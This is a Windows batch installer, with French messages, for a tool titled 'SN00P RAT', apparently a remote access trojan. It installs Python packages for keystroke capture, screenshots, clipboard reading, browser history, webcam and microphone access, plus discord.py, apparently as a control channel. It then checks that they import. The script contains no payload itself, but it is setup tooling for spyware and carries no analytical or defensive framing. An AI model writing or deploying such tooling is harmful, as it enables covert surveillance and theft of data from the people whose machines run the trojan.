@echo off
title INSTALLATION SN00P RAT
color 0A
echo ========================================
echo  INSTALLATION DES DEPENDANCES CURY
echo ========================================
echo.

:: Vérifier Python
python --version >nul 2>&1 || ( echo [ERREUR] Python introuvable. & pause & exit /b 1 )

:: Mise à jour pip
python -m pip install --upgrade pip setuptools wheel -q

:: Modules critiques (obligatoires)
echo [1/3] Installation des modules principaux...
pip install pyautogui mss pynput discord.py requests pillow comtypes pyperclip pywin32 psutil ipaddress -q --no-cache-dir

:: Modules optionnels (ignore les erreurs)
echo [2/3] Installation des modules optionnels...
pip install browserhistory opencv-python numpy pyaudio wave -q --no-cache-dir 2>nul

:: Fallback pour pyaudio (via pipwin)
echo [3/3] Verification pyaudio...
python -c "import pyaudio" >nul 2>&1
if errorlevel 1 (
    pip install pipwin -q --no-cache-dir 2>nul
    pipwin install pyaudio -q 2>nul
)

:: Test final
echo.
python -c "import pyautogui, mss, pynput, discord, requests, PIL, comtypes, pyperclip, win32api, psutil" >nul 2>&1
if errorlevel 1 ( echo [ECHEC] Certains modules manquent. Relancez manuellement. ) else ( echo [SUCCES] Tous les modules sont presents. )

echo.
pause